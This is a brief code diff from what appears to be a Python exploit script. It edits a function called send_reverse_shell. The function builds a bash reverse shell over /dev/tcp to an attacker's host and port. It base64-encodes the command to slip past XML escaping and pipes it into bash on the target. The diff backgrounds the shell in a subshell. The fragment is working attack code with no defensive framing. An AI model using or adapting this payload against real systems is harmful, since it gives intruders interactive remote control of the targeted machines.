@@ -217,7 +217,7 @@ def send_reverse_shell(session, base_url, token, uuid, lhost, lport):
     Encode reverse shell payload as base64 to avoid XML special character issues
     with redirect operators (>& becomes &amp;& in XML).
     """
-    inner = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
+    inner = f"(bash -i >& /dev/tcp/{lhost}/{lport} 0>&1) &"
     b64 = base64.b64encode(inner.encode()).decode()
     payload = f"printf {b64}|base64 -d|bash"
 
